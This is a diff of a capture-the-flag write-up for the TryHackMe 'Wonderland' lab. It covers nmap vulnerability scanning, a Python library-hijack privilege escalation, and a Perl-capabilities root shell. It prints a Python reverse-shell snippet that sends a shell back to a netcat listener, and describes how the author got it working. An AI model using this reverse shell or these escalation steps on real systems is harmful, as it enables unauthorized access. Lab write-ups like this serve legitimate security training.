@@ -40,7 +40,7 @@ Read data files from: /usr/local/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sat Oct  8 12:24:52 2022 -- 1 IP address (1 host up) scanned in 15.96 seconds
 ```  
-Not much, apparently I didn't pass the parameters to **nnmap** properly and all that shows up in 
+Not much, apparently I didn't pass the parameters to **nmap** properly and all that shows up in 
 the report is some versioning.  I'll run `nmap` on it's own and run the **vuln** suite of scripts 
 on port 80  
 `nmap -A -sV --script vuln -vvv -p 80 10.10.157.233`  
@@ -230,7 +230,8 @@ alice@wonderland:~$ ls -l /root/user.txt
 -rw-r--r-- 1 root root 32 May 25  2020 /root/user.txt
 ```
 
-But of course! Owned by root, but it's world readable. We are part of the world, let's read it!  
+But of course! Owned by root, but it's world readable. We are part of the world, even if the 
+world is upside down, let's read it!  
 
 `cat /root/user.txt` does the trick.
 
@@ -250,7 +251,8 @@ User alice may run the following commands on wonderland:
 
 It's not root but we can move laterally to another user here. By exploiting what is known 
 as _Python Library injection_ we will put some code into a module that Python will 
-_mistakenly_ run for us. This code will spawn a shell as the user **rabbit**.  
+_mistakenly_ run for us instead of the library module the script's author intended. 
+This code will spawn a shell as the user **rabbit**.  
 
 The first line of `walrus_and_the_carpenter.py` imports the *_random_* module.  
 
@@ -269,10 +271,12 @@ for i in range(10):
 The script is intended to print 10 random lines of a long scroll of text. The first line 
 of the script imports the standard library module named _random_. However, Python 
 will import a module with that name if it is found in the same directory as the script 
-being run. That is what we will do. Put a Python module of our own making next to the 
-script we will run with sudo as **rabbit**. The code below is cribbed from a well known stash of useful stuff [PayLoad All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+being run. That is what we will do. Put a Python module of our own making named the same as
+the library module we are wanting to substitute. By placing this file in the same directory as 
+the script we will run it will get used instead of Python looking for a library module.  
+The code below is cribbed from a well known stash of useful stuff [PayLoad All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-```py
+```python
 import socket,os,pty
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -282,7 +286,10 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/sh")
 ```  
-
+Actually, the code above didn't work when I tried it. I cheated a bit and referring 
+to one of the Writeups attached to the room discovered that substituting the `subprocess` 
+module for `pty` in the code I tried to use was successful. `subprocess.call([parameters])` 
+replaced `pty.spawn(parameter)`.  
 At this point I need to open up another terminal and start a NetCat listener to 
 catch the shell I'm sending back to the attacker box.  
 
@@ -290,7 +297,7 @@ catch the shell I'm sending back to the attacker box.
 
 That's half the users we can impersonate on this host. In retrospect, should  probably 
 keep hands off the **tryhackme** user. It appears the service running the web service 
-finds a hone here.  
+finds a home here.  
 We have creds now for alice and can move to another user rabbit. What can we find as 
 rabbit after stabilizing the shell for our rabbit user?  
 
@@ -331,7 +338,7 @@ of PE(privilege escalation).
 
 From [GTFObins](https://gtfobins.github.io/gtfobins/perl/#capabilities) we see some 
 sample code that this time **will** launch a root shell. Let's try it out and see.  
-![privESC to root](prelFTW.png)  
+![privESC to root](assets/perlFTW.png)  
 
 We have Lift Off!  
 Now I can read the `root.txt` left in alice's home and it's a wrap for Wonderland.  
